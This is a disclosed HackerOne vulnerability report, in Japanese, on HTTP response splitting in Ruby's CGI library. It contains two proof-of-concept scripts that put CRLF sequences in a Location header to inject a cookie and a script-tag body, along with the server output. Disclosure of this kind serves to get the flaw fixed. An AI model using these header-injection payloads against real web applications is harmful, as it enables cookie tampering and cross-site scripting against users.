---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1204695'
original_report_id: '1204695'
title: RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する
weakness: HTTP Response Splitting
team_handle: ruby
created_at: '2021-05-21T01:10:02.661Z'
disclosed_at: '2022-11-24T01:46:39.911Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: https://github.com/ruby/ruby
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- http-response-splitting
---

# RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する

## Metadata

- HackerOne Report ID: 1204695
- Weakness: HTTP Response Splitting
- Program: ruby
- Disclosed At: 2022-11-24T01:46:39.911Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC1:
```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
url = "http://example.jp\r\nSet-Cookie: foo=bar;"     # External Parameter
print cgi.header({'status' => '302 Found', 'Location' => url})
```

Actual Result1:
```
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 302 Found
Date: Fri, 21 May 2021 00:46:33 GMT
Server: Apache/2.2.31 (Unix)
Set-Cookie: foo=bar;
Location: http://example.jp
Content-Length: 0
Content-Type: text/html

```

このケースでは不正なクッキーが注入される。


PoC2:
```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
url = "http://example.jp\r\nStatus: 500\r\n\r\n<script>alert(1)</script>"  # External Parameter
print cgi.header({'status' => '302 Found', 'Location' => url})
```

Actual Result2:
```
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 500 Internal Server Error
Date: Fri, 21 May 2021 00:49:44 GMT
Server: Apache/2.2.31 (Unix)
Location: http://example.jp
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

<script>alert(1)</script>

```

このケースでは500 Internal Server Errorのため、Locationヘッダは無視され、JavaScriptが実行される。

## Impact

意図しないHTTPレスポンスヘッダやHTTPレスポンスボディを外部から注入できます。
単純なHTTPヘッダインジェクションでは、クッキーのインジェクションやリダイレクト等が主な影響となりますが、このケースでは、レスポンスボディが注入できるため、不正なJavaScript実行に及ぶため、影響が大きいと考えます。

他の言語の場合、PHPのheader関数は "\r"  "\n"   "\r\n"   等をすべてエラーにするため、上記の攻撃はできません。

過去のWEBrickやPumaにも類似の脆弱性がありましたが、これらは単独のキャリッジリターン "\r" による攻撃しかできず、リバースプロキシとしてNginxがあれば、Nginx側にてエラーになります。したがって、現実的な危険性はほとんどないと考えます。

https://www.ruby-lang.org/en/news/2019/10/01/http-response-splitting-in-webrick-cve-2019-16254/
https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v

一方、今回報告した問題は、CGIの仕様上ウェブサーバーやリバースプロキシ側でエラーにすることはできないため、影響が現実的です。

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
